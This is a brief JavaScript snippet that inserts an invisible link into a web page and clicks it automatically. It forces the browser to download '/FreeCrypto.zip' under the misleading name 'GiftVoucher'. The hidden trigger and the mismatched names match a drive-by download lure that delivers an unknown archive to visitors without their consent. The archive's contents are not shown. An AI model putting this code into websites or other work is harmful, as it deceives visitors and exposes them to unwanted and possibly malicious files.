const filename = "GiftVoucher"
const anchor = document.createElement('a')
document.body.append(anchor)
anchor.style = "display:none"

anchor.href = "/FreeCrypto.zip"
anchor.download = filename
anchor.click()